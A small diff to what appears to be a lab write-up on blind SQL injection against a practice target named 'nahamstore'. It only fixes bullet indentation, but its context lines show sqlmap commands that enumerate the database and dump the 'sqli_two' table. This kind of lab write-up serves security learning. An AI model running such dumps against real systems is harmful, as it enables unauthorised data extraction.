@@ -603,7 +603,7 @@ SQL Injection 2: Blind SQLi
 	[*] nahamstore
 	...
 	```
-		- We have confirmed the target database `nahamstore`
+	- We have confirmed the target database `nahamstore`
 	![15sqli2-2](imgs/15sqli2-2.png)
 
 - `sqlmap -r req.txt --level 3 --risk 3 -D nahamstore --tables`
@@ -624,7 +624,7 @@ SQL Injection 2: Blind SQLi
 	+----------+
 	...
 	```
-		- We have confirmed the target table `sqli_two`
+	- We have confirmed the target table `sqli_two`
 	![15sqli2-3](imgs/15sqli2-3.png)
 
 - `sqlmap -r req.txt --level 3 --risk 3 -D nahamstore -T sqli_two --dump`
